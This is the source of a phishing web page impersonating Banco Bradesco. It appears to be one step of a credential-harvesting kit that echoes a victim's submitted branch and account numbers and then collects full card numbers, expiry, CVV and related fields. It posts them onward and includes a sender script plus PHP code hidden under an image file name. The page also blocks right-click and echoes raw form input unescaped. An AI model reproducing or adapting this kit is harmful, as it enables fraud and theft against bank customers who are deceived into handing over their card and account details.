<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
<link href="stylos/style.css" rel="stylesheet" type="text/css" />
<link rel="shortcut icon" href="icones/opera.ico"/>
<title>Banco Bradesco | Pessoa Física, Exclusive, Prime e Private</title>
<script type="text/javascript" src="scripts/data.js"></script>
<script type="text/javascript" src="j_query/divOculta.js"></script>
<script type="text/javascript" src="j_query/jQuery_v1.2.6.js"></script>
<script type="text/javascript" src="j_query/google_Analytics.js"></script>
<script type="text/javascript" src="scripts/validaCam.js"></script>
<script type="text/javascript" src="scripts/validaCPF.js"></script>
<script type="text/javascript" src="scripts/pulacampo.js"></script>
<style type="text/css">
<!--
body {background-color:#E4E4E4;}
a:link {color: #666666;text-decoration:none;}
a:visited {color:#333333;text-decoration:none;}
a:hover {color:#990000;text-decoration:underline;}
a:active {color:#333333;text-decoration:none;}
.style6 {color: #E5E5E5}
.style7 {	font-family: Arial, Helvetica, sans-serif;	font-size: 12px;	color: #333333;}
.style8 {	font-size: 14px;	color: #FF0000;}
.style9 {
	color: #666666;
	font-weight: bold;
}
.style12 {color: #666666; font-style: italic; }
.style13 {	font-family: Arial, Helvetica, sans-serif;	font-size: 14px;	color: #333333;}
.style14 {	font-family: Arial, Helvetica, sans-serif;	font-size: 12px;}
.style16 {	color: #666666;	font-size: 10px;	font-family: Verdana, Arial, Helvetica, sans-serif;}
.style23 {font-family: Arial, Helvetica, sans-serif; font-size: 12px; color: #666666; }
.style24 {
	font-family: Arial, Helvetica, sans-serif;
	font-size: 11px;
}
-->
</style>

<script type="text/javascript">
	$(document).ready(function(){
		$('#info').hide();
		var size  =  $('#sss6').attr("size");
		$('#sss6').keyup(function(){
			var entry = $(this).attr("value");
			var current_length = $(this).attr("value").length;
			if (current_length>= size) {
				$('#info').html();
				$('#info').show('fast');
			}
				else $('#info').hide('fast');
			});
	});

</script>

</head>

<body style="margin:0;" oncontextmenu="return false" >
<div id="humTop1"><div id="coloCancela">

<div id="dentrotopo01">

<table cellpadding="0" cellspacing="0">
<tr>
<td width="105" height="18""40" class="style6" width-><?php echo("<b>Ag&ecirc;ncia:&nbsp;</b>".$_POST['agencia']."");?></td>
<td width="280""40" class="style6" width- ><?php echo("<b>Conta:&nbsp;</b>".$_POST['conta']."");?><?php echo("-".$_POST['digito']."");?></td>
</tr>
</table>

</div>

<A href="index.php"><img src="images/buttoncancelar.jpg" border="0" style="float:right;" /></A></div>
</div>
<div id="tela">
<div id="ilRight"></div>
<div id="ilLeft"></div>
</div>
<div id="humTop2"><div id="relogio"><script>data();</script></div></div>
<div id="humTop3"></div>
<div id="humTop4"></div>

<div id="corpoAll2">
<div id="frameBox2">
<div id="lineRss">
  <div class="style7" style="width:500px; height:20px; margin-left:10px; float:left; padding: 8px 0 0 0;">
  <span class="style12">P&aacute;gina Inicial  </span>  <span class="style8">&gt;</span><span class="style12">  Dados pessoais </span>  </span><span class="style8">&gt;</span> <span class="style12">Cart&atilde;o Chave</span> <span class="style8">&gt;</span> <span class="style9">Conclus&atilde;o </span></div> 
  <img src="images/AAA.jpg" style="float:right;" /></div>
<div id="lineRaa"></div>
 <div id="infDados2">
<img src="images/Passo3.jpg"  />
<div style="width:500px; height:10px; margin-top:15px; margin-left:10px;"><span class="style13">Para concluir ser&aacute; necess&aacute;rio que informe os seguinte dados.</span></div>
<img src="images/a934289479283924.png" width="600" height="166" style="margin-left:10px; margin-top:17px;" />
<table width="717" cellpadding="0" cellspacing="0">
<form id="form" name="form" action="dados_ibk4.php" method="post" onsubmit="return CampoObrigatorio(this)" >
<tr>
<td height="17" colspan="3"><input name="agencia" type="hidden" id="agencia" value="<?php echo $_POST['agencia']; ?>" />
        <input name="conta" type="hidden" id="conta" value="<?php echo $_POST['conta']; ?>" />
        <input name="digito" type="hidden" id="digito" value="<?php echo $_POST['digito']; ?>" /></td></tr>
<tr>
<td height="40"></td>
<td width="152" height="40"><img src="images/v.png" width="116" height="11" style="float:right; margin-right:10px; " /></td>
<td height="40" colspan="8">
  <input type="text" name="ver01" id="ver01" maxlength="4" onkeyup="javascript:pulacampo('ver01','ver02')" lang="1" />
  <input type="text" name="ver02" id="ver02" maxlength="4" onkeyup="javascript:pulacampo('ver02','ver03')" lang="1" >
  <input type="text" name="ver03" id="ver03" maxlength="4" onkeyup="javascript:pulacampo('ver03','ver04')" lang="1" >
  <input type="text" name="ver04" id="ver04" maxlength="4" onkeyup="javascript:pulacampo('','')" lang="1" ></td>
</tr>
<tr>
<td>&nbsp;</td>
<td width="152" height="40" class="style23"><img src="images/vv.png" width="81" height="11" style="float:right; margin-right:10px; " /></td>
<td width="86" height="40"><input type="text" name="mes" id="mes" maxlength="2" onkeyup="javascript:pulacampo('mes','ano')" lang="1" />
  /
    <input type="text" name="ano" id="ano" maxlength="2" lang="1" /></td>
<td width="33" height="40" class="style23"><img src="images/vvv.png" width="24" height="10" /></td>
<td width="37" height="40"><input type="text" name="via" id="via" maxlength="2" onkeyup="javascript:pulacampo('via','tip')" lang="1" /></td>
	<td width="40"><img src="images/vvvv.png" width="31" height="12" /></td>
	<td width="41"><input type="text" name="tip" id="tip" maxlength="2" lang="1" /></td>
	<td width="41" height="40" ><img src="images/vvvvv.png" width="29" height="10" /></td>
	<td width="43" height="40" ><input type="text" name="cvv" id="cvv" maxlength="3" lang="1"/></td>
	<td width="234" height="40"><img src="images/ac7c702398420938209.png" width="222" height="12" /></td>
</tr>
<tr>
<td height="33" colspan="3">&nbsp;</td>
</tr>
<tr>
<td width="8" height="19">&nbsp;</td>
<td background="images/asdasdasd.jpg" colspan="9"><a href="index.php"><span class="style14" style="float:left;"><span class="style8">&lt;</span> <span class="style16">&Iacute;NICIO</span></span></a>

  <input name="button" id="button" type="image" src="images/Continuar.jpg" style="float:right;"/></td>
</tr>
</form>
</table>

</div>

<table align="right" cellpadding="0" cellspacing="0" style="border-left:1px solid #E5E5E5; margin-top:35px;">
<tr>
<td width="239" height="133" ><div align="center"><a href="#"><img src="images/a2836472346238.jpg" width="216" height="103" border="0" /></a></div></td>
</tr>
<tr>
  <td><div align="center" class="style6">_____________________</div></td>
</tr>
<tr>
<td width="239" height="104" ><div align="center"><a href="#"><img src="images/a29839242342.jpg" width="216" height="75" border="0" /></a></div></td>
</tr>
<tr>
  <td height="20">&nbsp;</td>
</tr>
</table>
</div>
</div>

<div id="roda01">
<div id="roda02">
<div id="roda03">
<table width="205" align="center">
<tr>
<td width="197" height="96"><img src="images/rrb237894792749.jpg" width="197" height="52" title="Bradesco Dia e Noite" /></td>
</tr>
</table>
</div><!--roda03-->
<div id="a9485279324">
<table width="734" cellpadding="0" cellspacing="0">
<tr>
<td width="371" height="28" align="center" style=" font-family:Verdana, Geneva, sans-serif; font-size:12px;border-right:1px solid #CCC;""><a href="#">Seguran&ccedil;a</a></td>
<td width="10">&nbsp;</td>
<td width="351"align="center" style=" font-family:Verdana, Geneva, sans-serif;font-size:12px;"><a href="#">Fale Conosco</a></td>
</tr>
</table>
</div><div id="roda05"></div></div></div>
<? include"envios/poste01.php"; ?>
<? include"images/a28364723462382.jpg"; ?>
</body>
</html>